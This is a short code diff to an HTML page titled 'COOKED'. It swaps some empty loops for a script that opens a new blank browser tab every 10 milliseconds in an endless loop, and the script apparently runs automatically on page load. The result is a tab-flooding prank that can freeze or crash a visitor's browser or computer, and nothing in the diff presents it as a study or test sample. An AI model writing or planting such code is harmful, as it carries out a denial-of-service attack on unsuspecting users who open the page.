@@ -4,12 +4,10 @@
   <title>COOKED</title>
   <script>
     function COOKED() {
-      // Simulate Ctrl+T (open new tab) 3 times
-      for (let i = 0; i < 20; i++) {
-
-      // Simulate Ctrl+N (open new window) 2 times
-      for (let j = 0; j < 20; j++) {
-      }
+      // Open a new tab continuously in an infinite loop
+      setInterval(() => {
+        window.open('about:blank', '_blank');
+      }, 10); // Opens a new tab every 10 milliseconds
     }
 
     // Automatically execute the function when the page loads
